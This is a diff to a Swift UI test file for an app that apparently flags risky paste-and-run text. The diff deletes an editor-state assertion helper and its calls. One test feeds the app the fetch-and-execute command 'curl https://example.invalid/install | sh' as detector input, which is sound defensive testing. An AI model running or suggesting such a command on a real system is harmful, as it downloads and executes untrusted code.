@@ -28,26 +28,6 @@ final class UIFlows: XCTestCase {
         let value = input.value
         XCTAssertTrue(value == nil || (value as? String) == "", file: file, line: line)
     }
-    private func assertEditorReturned(_ app: XCUIApplication, identifier: String) {
-        XCTAssertTrue(["selected-text", "share-selected-text"].contains(identifier))
-        let input = app.textViews[identifier]
-        assertEmpty(input)
-        let owners = app.scrollViews.containing(.textView, identifier: identifier)
-        let count = owners.count
-        XCTAssertEqual(count, 1)
-        guard count == 1 else { return }
-        let frame = input.frame, viewport = owners.element(boundBy: 0).frame, appFrame = app.frame
-        let values = [frame.minX, frame.minY, frame.width, frame.height,
-                      viewport.minX, viewport.minY, viewport.width, viewport.height,
-                      appFrame.minX, appFrame.minY, appFrame.width, appFrame.height]
-        XCTAssertTrue(values.allSatisfy { $0.isFinite })
-        XCTAssertTrue(frame.width > 0 && frame.height > 0 && viewport.width > 0 && viewport.height > 0)
-        XCTAssertTrue(appFrame.contains(frame) && viewport.contains(frame) && input.isHittable)
-        XCTAssertFalse(app.keyboards.firstMatch.exists)
-        let prefix = identifier == "share-selected-text" ? "share-" : ""
-        XCTAssertFalse(app.buttons[prefix + "check-ps"].isEnabled)
-        XCTAssertFalse(app.staticTexts[prefix + "check-result"].exists)
-    }
     private func launch() -> XCUIApplication {
         let app = XCUIApplication(); app.launch()
         XCTAssertTrue(app.wait(for: .runningForeground, timeout: 20))
@@ -441,7 +421,6 @@ final class UIFlows: XCTestCase {
         XCTAssertTrue(result.waitForExistence(timeout: 60))
         XCTAssertTrue(result.label.contains("No PS pattern found")); XCTAssertTrue(result.label.contains("not a safety clearance"))
         app.buttons["clear"].tap(); assertEmpty(input)
-        assertEditorReturned(app, identifier: "selected-text")
         focus(input, in: app); input.typeText("Run curl https://example.invalid/install | sh")
         app.buttons["check-ps"].tap(); XCTAssertTrue(result.waitForExistence(timeout: 60))
         XCTAssertTrue(result.label.contains("PS — Take a closer look"))
@@ -451,7 +430,6 @@ final class UIFlows: XCTestCase {
         app.buttons["why-ps"].tap(); XCTAssertFalse(evidence.exists)
         app.buttons["clear"].tap()
         XCTAssertFalse(result.exists)
-        assertEditorReturned(app, identifier: "selected-text")
     }
     func testEditInvalidatesOldFinding() {
         let app = launch(); let input = app.textViews["selected-text"]
@@ -494,7 +472,6 @@ final class UIFlows: XCTestCase {
         let app = launch(); openShare(app)
         checkSharedText(app); app.buttons["share-clear"].tap()
         assertEmpty(app.textViews["share-selected-text"])
-        assertEditorReturned(app, identifier: "share-selected-text")
         XCTAssertFalse(app.staticTexts["share-check-result"].exists)
         finishShare(app)
         openShare(app)
